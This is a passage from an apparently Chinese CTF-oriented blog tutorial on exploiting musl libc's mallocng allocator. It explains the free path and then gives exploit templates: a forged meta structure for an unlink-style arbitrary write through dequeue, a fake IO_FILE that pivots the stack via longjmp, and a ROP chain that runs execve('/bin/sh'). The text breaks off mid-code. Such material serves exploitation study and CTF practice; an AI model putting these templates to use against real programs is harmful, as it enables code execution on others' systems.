mi.len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<ul>
<li>通过<code>get_meta()</code>找到chunk对应的meta，重置idx与offset，将meta的freed_mask中标记一下就算释放完毕了。</li>
<li>有一些特殊情况的，需要跳出循环来调用<code>nontrivial_free()</code>完成相关操作</li>
</ul>

        <h4 id="①nontrivial-free"   >
          <a href="#①nontrivial-free" class="heading-link"><i class="fas fa-link"></i></a><a href="#①nontrivial-free" class="headerlink" title="①nontrivial_free()"></a>①nontrivial_free()</h4>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct mapinfo <span class="title">nontrivial_free</span><span class="params">(struct meta *g, <span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">uint32_t</span> self = <span class="number">1u</span>&lt;&lt;i;</span><br><span class="line">	<span class="keyword">int</span> sc = g-&gt;sizeclass;</span><br><span class="line">	<span class="keyword">uint32_t</span> mask = g-&gt;freed_mask | g-&gt;avail_mask;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//如果meta-group中所有chunk要么被释放要么可使用</span></span><br><span class="line">    <span class="comment">//并且g可以被释放(不是mmap出来的),那么就要回收掉整个meta</span></span><br><span class="line">	<span class="keyword">if</span> (mask+self == (<span class="number">2u</span>&lt;&lt;g-&gt;last_idx)<span class="number">-1</span> &amp;&amp; okay_to_free(g)) &#123;</span><br><span class="line">		<span class="comment">// any multi-slot group is necessarily on an active list</span></span><br><span class="line">		<span class="comment">// here, but single-slot groups might or might not be.</span></span><br><span class="line">		<span class="keyword">if</span> (g-&gt;next) &#123;</span><br><span class="line">             <span class="comment">//检查sc释放合法, 不是mmap(63)的</span></span><br><span class="line">			assert(sc &lt; <span class="number">48</span>);</span><br><span class="line">            <span class="comment">//如果g是队列中开头的meta, 那么弹出队列后, 要激活后一个</span></span><br><span class="line">			<span class="keyword">int</span> activate_new = (ctx.active[sc]==g);</span><br><span class="line">			dequeue(&amp;ctx.active[sc], g);</span><br><span class="line">            <span class="comment">//激活后一个meta过程中需要完成avail_mask和free_mask的设置</span></span><br><span class="line">            <span class="comment">//即free_mask向avail_maks进行转移</span></span><br><span class="line">			<span class="keyword">if</span> (activate_new &amp;&amp; ctx.active[sc])</span><br><span class="line">				activate_group(ctx.active[sc]);</span><br><span class="line">		&#125;</span><br><span class="line">        <span class="comment">//现在要释放这个meta-group,放入ctx.free_meta_head中</span></span><br><span class="line">		<span class="keyword">return</span> free_group(g);</span><br><span class="line">        </span><br><span class="line">	&#125; </span><br><span class="line">    <span class="comment">//如果mask==0, 也就是这个meta-group中所有的chunk都被分配出去了</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!mask) &#123;</span><br><span class="line">		assert(sc &lt; <span class="number">48</span>);</span><br><span class="line">		<span class="comment">// might still be active if there were no allocations</span></span><br><span class="line">		<span class="comment">// after last available slot was taken.</span></span><br><span class="line">        <span class="comment">//现在这个全部chunk被分配出去的group中有一个chunk要被释放了</span></span><br><span class="line">        <span class="comment">//因此这个meta-group要重新入队</span></span><br><span class="line">		<span class="keyword">if</span> (ctx.active[sc] != g) &#123;</span><br><span class="line">			<span class="built_in">queue</span>(&amp;ctx.active[sc], g);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	a_or(&amp;g-&gt;freed_mask, self);</span><br><span class="line">	<span class="keyword">return</span> (struct mapinfo)&#123; <span class="number">0</span> &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h4 id="②dequeue"   >
          <a href="#②dequeue" class="heading-link"><i class="fas fa-link"></i></a><a href="#②dequeue" class="headerlink" title="②dequeue"></a>②dequeue</h4>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v1.2.1 /src/malloc/mallocng/meta.h</span></span><br><span class="line"><span class="comment">//meta的出队操作，一般漏洞点出在这里</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">dequeue</span><span class="params">(struct meta **phead, struct meta *m)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (m-&gt;next != m) &#123;</span><br><span class="line">		m-&gt;prev-&gt;next = m-&gt;next;</span><br><span class="line">		m-&gt;next-&gt;prev = m-&gt;prev;</span><br><span class="line">		<span class="keyword">if</span> (*phead == m) *phead = m-&gt;next;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		*phead = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	m-&gt;prev = m-&gt;next = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>没有检测meta中的next和prev指针是否合法，如果可以伪造一个meta传入，控制它的prev/next指针，就可以做到像unlink一样的任意写</p>

        <h4 id="③queue"   >
          <a href="#③queue" class="heading-link"><i class="fas fa-link"></i></a><a href="#③queue" class="headerlink" title="③queue"></a>③queue</h4>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v1.2.2 /src/malloc/mallocng/meta.h</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">queue</span><span class="params">(struct meta **phead, struct meta *m)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	assert(!m-&gt;next);</span><br><span class="line">	assert(!m-&gt;prev);</span><br><span class="line">	<span class="keyword">if</span> (*phead) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">head</span> =</span> *phead;</span><br><span class="line">		m-&gt;next = head;</span><br><span class="line">		m-&gt;prev = head-&gt;prev;</span><br><span class="line">		m-&gt;next-&gt;prev = m-&gt;prev-&gt;next = m;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		m-&gt;prev = m-&gt;next = m;</span><br><span class="line">		*phead = m;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>当meta进入该函数，就会发生解链，然后进入到对应的active[sc]中，这种情况需要active[sc] = NULL，即该sizeclass下暂时不存在可用的meta。</p>

        <h2 id="🔺注：-1"   >
          <a href="#🔺注：-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#🔺注：-1" class="headerlink" title="🔺注："></a>🔺注：</h2>
      <p>malloc和free的时候不会将chunk的内容置空，这个给我们创造了UAF的一些条件，同样的也有相应的静态堆内存</p>

        <h2 id="4-利用方式"   >
          <a href="#4-利用方式" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-利用方式" class="headerlink" title="4.利用方式"></a>4.利用方式</h2>
      
        <h3 id="1-泄露地址-1"   >
          <a href="#1-泄露地址-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-泄露地址-1" class="headerlink" title="(1)泄露地址"></a>(1)泄露地址</h3>
      <p>通常使用静态堆内存来进行泄露，但是这里就涉及一个问题，静态堆内存就算申请到了，也没有指针啊。所以现在的题目好多都是申请一个chunk结构体，比如</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">strChunk</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">char</span> size[<span class="number">8</span>];</span><br><span class="line">	<span class="keyword">char</span>* data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">strChunk</span>* <span class="title">myChunk</span> =</span> <span class="built_in">malloc</span>(xxx); </span><br><span class="line">myChunk.data = <span class="built_in">malloc</span>(xxx);</span><br></pre></td></tr></table></div></figure>

<p>这样在在一定的UAF或者溢出条件下，就可以泄露出data指针，而如果这个data指针恰好是从静态堆内存申请出来的，那么就能泄露libc地址了。</p>
<p>heap地址也是类似，一般就是通过溢出或者UAF之类的来泄露了。</p>
<p>如果没有的话，我能想到的就是无限申请，直到耗尽meta的空间，当它再开辟的meta空间的时候，由于是mmap分配的，那么就有可能申请出libc的空间</p>

        <h3 id="2-getshell-1"   >
          <a href="#2-getshell-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-getshell-1" class="headerlink" title="(2)getshell"></a>(2)getshell</h3>
      
        <h4 id="①secret"   >
          <a href="#①secret" class="heading-link"><i class="fas fa-link"></i></a><a href="#①secret" class="headerlink" title="①secret"></a>①secret</h4>
      <p>想要伪造meta，首先需要泄露secrect校验值</p>

        <h4 id="②伪造meta"   >
          <a href="#②伪造meta" class="heading-link"><i class="fas fa-link"></i></a><a href="#②伪造meta" class="headerlink" title="②伪造meta"></a>②伪造meta</h4>
      <p>先行的方法基本都是伪造<code>meta</code>，伪造之后通常是通过两种方法进行利用，不同的方法伪造的<code>meta</code>基本也是不同的，下面具体介绍。</p>

        <h5 id="a-dequeue"   >
          <a href="#a-dequeue" class="heading-link"><i class="fas fa-link"></i></a><a href="#a-dequeue" class="headerlink" title="a.dequeue"></a>a.dequeue</h5>
      <p>调用链为</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_libc_free-&gt;nontrivial_free-&gt;dequeue</span><br></pre></td></tr></table></div></figure>

<p>这种是通过<code>dequeue</code>进行任意写覆盖<code>__stdout_used</code>指针(就像libc里面的<code>IO_list_all</code>)，然后伪造<code>__IO_FILE</code>，通过IO进行攻击。</p>
<p>伪造的<code>meta</code></p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">sizeclass = <span class="number">1</span>      	<span class="comment">#</span></span><br><span class="line">freeable = <span class="number">1</span></span><br><span class="line">last_idx = <span class="number">6</span>  		<span class="comment">#</span></span><br><span class="line">maplen = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">fake_meta = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_meta += p64(stdout_used_addr-<span class="number">0x8</span>) 		<span class="comment"># prev</span></span><br><span class="line">fake_meta += p64(fake_IO_addr)			 	<span class="comment"># next</span></span><br><span class="line">fake_meta += p64(base) 						<span class="comment"># mem</span></span><br><span class="line">fake_meta += p32(<span class="number">0x7e</span>) + p32(<span class="number">0</span>) <span class="comment"># avail_mask, freed_mask</span></span><br><span class="line">fake_meta += p64((maplen &lt;&lt; <span class="number">12</span>) | (sizeclass &lt;&lt; <span class="number">6</span>) | (freeable &lt;&lt; <span class="number">5</span>) | last_idx)</span><br><span class="line">fake_meta += p64(<span class="number">0</span>)</span><br></pre></td></tr></table></div></figure>

<ul>
<li><p>获取<code>__stdout_used</code></p>
<p>这里通过<code>dequeue</code>就是将<code>fake_IO_addr</code>赋值给<code>__stdout_used</code>，<img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230816194459069.png" alt="image-20230816194459069"></p>
<p>里面存放的是<code>stdout</code>的<code>__IO_FILE</code>结构体。对于去掉符号信息的<code>libc</code>，不知道<code>__stdout_used</code>在哪的可以尝试分析<code>exit</code>里面调用的<code>__stdio_exit</code>函数去看在哪里，</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v1.2.2 /src/exit/exit.c</span></span><br><span class="line"><span class="function">_Noreturn <span class="keyword">void</span> <span class="title">exit</span><span class="params">(<span class="keyword">int</span> code)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	__funcs_on_exit();</span><br><span class="line">	__libc_exit_fini();</span><br><span class="line">	__stdio_exit();</span><br><span class="line">	_Exit(code);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230816195302098.png" alt="image-20230816195302098"></p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v1.2.2 /src/stdio/__stdio_exit.c</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> __stdio_exit(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">	FILE *f;</span><br><span class="line">	<span class="keyword">for</span> (f=*__ofl_lock(); f; f=f-&gt;next) close_file(f);</span><br><span class="line">	close_file(__stdin_used);</span><br><span class="line">	close_file(__stdout_used);</span><br><span class="line">	close_file(__stderr_used);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230816195412866.png" alt="image-20230816195412866"></p>
<p>其实这里也可以看到，劫持<code>__stdin_used/__stderr_used</code>也是一样的效果，但是实际中比较不容易出错的应该是<code>__stdout_used</code>用的比较多</p>
</li>
<li><p>伪造<code>fake_IO_addr</code></p>
<p>主要是伪造几个关键的点，常见的伪造模板如下</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ROP</span></span><br><span class="line"></span><br><span class="line">gadget_addr = libc_base + libc.sym[<span class="string">&#x27;longjmp&#x27;</span>] + <span class="number">30</span></span><br><span class="line"><span class="comment">#mov     rsp, [rdi+30h];jmp     qword ptr [rdi+38h]</span></span><br><span class="line"></span><br><span class="line">fake_IO = p64(<span class="number">0</span>)                       			<span class="comment"># flags</span></span><br><span class="line">fake_IO += p64(<span class="number">0</span>)                               <span class="comment"># rpos</span></span><br><span class="line">fake_IO += p64(<span class="number">0</span>)                               <span class="comment"># rend</span></span><br><span class="line">fake_IO += p64(rop_addr)                        <span class="comment"># close</span></span><br><span class="line">fake_IO += p64(<span class="number">1</span>)                               <span class="comment"># wend</span></span><br><span class="line">fake_IO += p64(<span class="number">1</span>)                               <span class="comment"># wpos</span></span><br><span class="line">fake_IO += p64(rop_addr+<span class="number">0x8</span>)                    <span class="comment"># mustbezero_1 	#0x30</span></span><br><span class="line">fake_IO += p64(pop_rdi_ret)                     <span class="comment"># wbase			#0x38</span></span><br><span class="line">fake_IO += p64(<span class="number">0</span>)                               <span class="comment"># read</span></span><br><span class="line">fake_IO += p64(gadget_addr)  					<span class="comment"># write</span></span><br><span class="line"></span><br><span class="line">binsh_addr = libc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">rop = <span class="string">&quot;&quot;</span></span><br><span class="line">rop += p64(pop_rdi_ret) + p64(binsh_addr)</span><br><span class="line">rop += p64(pop_rsi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(pop_rdx_ret) + p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(pop_rax_ret) + p64(<span class="number">59</span>)</span><br><span class="line">rop += p64(syscall_ret)</span><br></pre></td></tr></table></div></figure>

<p>通过<code>close_file</code>函数中的<code>f-&gt;write</code>进入<code>gadget</code>，然后依据<code>rdi</code>劫持<code>rsp</code>，从而进行<code>ROP</code></p>
</li>
<li><p><code>base</code>获取</p>
<p>这个通常是用来绕过在进入<code>nontrivial_free</code>函数之前的<code>get_meta</code>函数中针对<code>meta</code>检查的，链子为<code>__libc_free-&gt;get_meta</code>在如下代码中</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v1.2.2 /src/malloc/mallocng/meta.h</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> struct meta *<span class="title">get_meta</span><span class="params">(<span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	assert(!((<span class="keyword">uintptr_t</span>)p &amp; <span class="number">15</span>));</span><br><span class="line">	<span class="keyword">int</span> offset = *(<span class="keyword">const</span> <span class="keyword">uint16_t</span> *)(p - <span class="number">2</span>);</span><br><span class="line">	<span class="keyword">int</span> index = get_slot_index(p);</span><br><span class="line">	<span class="keyword">if</span> (p[<span class="number">-4</span>]) &#123;</span><br><span class="line">		assert(!offset);</span><br><span class="line">		offset = *(<span class="keyword">uint32_t</span> *)(p - <span class="number">8</span>);</span><br><span class="line">		assert(offset &gt; <span class="number">0xffff</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">base</span> =</span> (<span class="keyword">const</span> <span class="keyword">void</span> *)(p - UNIT*offset - UNIT);</span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span> =</span> base-&gt;meta;</span><br><span class="line">	assert(meta-&gt;mem == base);  <span class="comment">//主要用来绕过这里</span></span><br><span class="line">	assert(index &lt;= meta-&gt;last_idx);</span><br><span class="line">	assert(!(meta-&gt;avail_mask &amp; (<span class="number">1u</span>&lt;&lt;index)));</span><br><span class="line">	assert(!(meta-&gt;freed_mask &amp; (<span class="number">1u</span>&lt;&lt;index)));</span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">area</span> =</span> (<span class="keyword">void</span> *)((<span class="keyword">uintptr_t</span>)meta &amp; <span class="number">-4096</span>);</span><br><span class="line">	assert(area-&gt;check == ctx.secret);</span><br><span class="line">	<span class="keyword">if</span> (meta-&gt;sizeclass &lt; <span class="number">48</span>) &#123;</span><br><span class="line">		assert(offset &gt;= size_classes[meta-&gt;sizeclass]*index);</span><br><span class="line">		assert(offset &lt; size_classes[meta-&gt;sizeclass]*(index+<span class="number">1</span>));</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		assert(meta-&gt;sizeclass == <span class="number">63</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (meta-&gt;maplen) &#123;</span><br><span class="line">		assert(offset &lt;= meta-&gt;maplen*<span class="number">4096UL</span>/UNIT - <span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> (struct meta *)meta;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>需要满足<code>meta-&gt;mem=base</code>，这里的<code>base</code>就是通过进入索引为0的<code>chunk_addr-0x10</code>，比如如下索引为0的<code>chunk</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230817192343088.png" alt="image-20230817192343088"></p>
<p>这里获取得到<code>base</code>之后，进一步得到<code>meta</code>，即为<code>0x7ffff7fff0010</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230817192915034.png" alt="image-20230817192915034"></p>
</li>
<li><p>设置<code>avail_mask</code>、<code>freed_mask</code>、<code>last_idx</code>、<code>freeable</code>、<code>sizeclass</code>、<code>maplen</code></p>
<p>设置这几个参数，主要用于通过<code>nontrivial_free</code>函数中的检查，包括<code>ok_to_free</code>和<code>get_stride</code>，如下代码所示</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v1.2.2 /src/malloc/mallocng/free.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct mapinfo <span class="title">nontrivial_free</span><span class="params">(struct meta *g, <span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">uint32_t</span> self = <span class="number">1u</span>&lt;&lt;i;</span><br><span class="line">	<span class="keyword">int</span> sc = g-&gt;sizeclass;</span><br><span class="line">	<span class="keyword">uint32_t</span> mask = g-&gt;freed_mask | g-&gt;avail_mask;</span><br><span class="line">	</span><br><span class="line">    <span class="comment">//通过适当计算进行设置,0x7e+1 == (2&lt;&lt;1)-1 == 127</span></span><br><span class="line">    <span class="comment">//ok_to_free就是做一些检查,满足freeable==1,sizeclass&lt;48,maplen==1</span></span><br><span class="line">    <span class="comment">//然后通过g-&gt;next!=g来返回1</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">//v1.2.2  /src/malloc/mallocng/free.c</span></span><br><span class="line"><span class="comment">static int okay_to_free(struct meta *g)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">	int sc = g-&gt;sizeclass;</span></span><br><span class="line"><span class="comment">	if (!g-&gt;freeable) return 0;</span></span><br><span class="line"><span class="comment">	if (sc &gt;= 48 || get_stride(g) &lt; UNIT*size_classes[sc])</span></span><br><span class="line"><span class="comment">		return 1;</span></span><br><span class="line"><span class="comment">	if (!g-&gt;maplen) return 1;</span></span><br><span class="line"><span class="comment">	if (g-&gt;next != g) return 1;</span></span><br><span class="line"><span class="comment">	if (!is_bouncing(sc)) return 1;</span></span><br><span class="line"><span class="comment">	size_t cnt = g-&gt;last_idx+1;</span></span><br><span class="line"><span class="comment">	size_t usage = ctx.usage_by_class[sc];</span></span><br><span class="line"><span class="comment">	if (9*cnt &lt;= usage &amp;&amp; cnt &lt; 20)</span></span><br><span class="line"><span class="comment">		return 1;</span></span><br><span class="line"><span class="comment">	return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">	<span class="keyword">if</span> (mask+self == (<span class="number">2u</span>&lt;&lt;g-&gt;last_idx)<span class="number">-1</span> &amp;&amp; okay_to_free(g)) &#123;</span><br><span class="line">		<span class="keyword">if</span> (g-&gt;next) &#123;</span><br><span class="line">			assert(sc &lt; <span class="number">48</span>);</span><br><span class="line">            <span class="comment">//......</span></span><br><span class="line">			dequeue(&amp;ctx.active[sc], g);</span><br><span class="line">            <span class="comment">//.....</span></span><br><span class="line">		&#125;</span><br><span class="line">        <span class="comment">//....</span></span><br><span class="line">		<span class="keyword">return</span> free_group(g);</span><br><span class="line">	&#125; </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!mask) &#123;</span><br><span class="line">        <span class="comment">//.....</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//....</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>🔺注：这个<code>last_idx</code>随便改的话可能会在<code>__libc_free</code>中出现错误，就是一个依据<code>last_idx</code>判断<code>chunk</code>上某个位置是否为0，这个也比较好改</p>
</li>
</ul>
<p>总体来说进入<code>dequeue</code>就算成功，实现任意地址任意写，将<code>__stdout_used</code>的值劫持为<code>fake_IO_addr</code>。之后就大多通过调用链<code>exit()-&gt;__stdio_exit()-&gt;close_file()-&gt;(f-&gt;write(f,0,0))</code>，跳转到<code>gadget</code>完成栈劫持利用的。</p>

        <h5 id="b-queue"   >
          <a href="#b-queue" class="heading-link"><i class="fas fa-link"></i></a><a href="#b-queue" class="headerlink" title="b.queue"></a>b.queue</h5>
      <p>调用链为</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_libc_free-&gt;nontrivial_free-&gt;queue</span><br></pre></td></tr></table></div></figure>

<p>看一下<code>nontrivial_free</code>源代码就能理解，就是通过条件满足</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v1.2.2 /src/malloc/mallocng/free.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct mapinfo <span class="title">nontrivial_free</span><span class="params">(struct meta *g, <span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">uint32_t</span> self = <span class="number">1u</span>&lt;&lt;i;</span><br><span class="line">	<span class="keyword">int</span> sc = g-&gt;sizeclass;</span><br><span class="line">	<span class="keyword">uint32_t</span> mask = g-&gt;freed_mask | g-&gt;avail_mask;</span><br><span class="line">	</span><br><span class="line">    <span class="comment">//通过适当计算进行设置,0x7e+1 == (2&lt;&lt;1)-1 == 127</span></span><br><span class="line">    <span class="comment">//ok_to_free就是做一些检查,满足freeable==1,sizeclass&lt;48,maplen==1</span></span><br><span class="line">    <span class="comment">//然后通过g-&gt;next!=g来返回1</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">//v1.2.2  /src/malloc/mallocng/free.c</span></span><br><span class="line"><span class="comment">static int okay_to_free(struct meta *g)</span></span><br><span class="line"><span 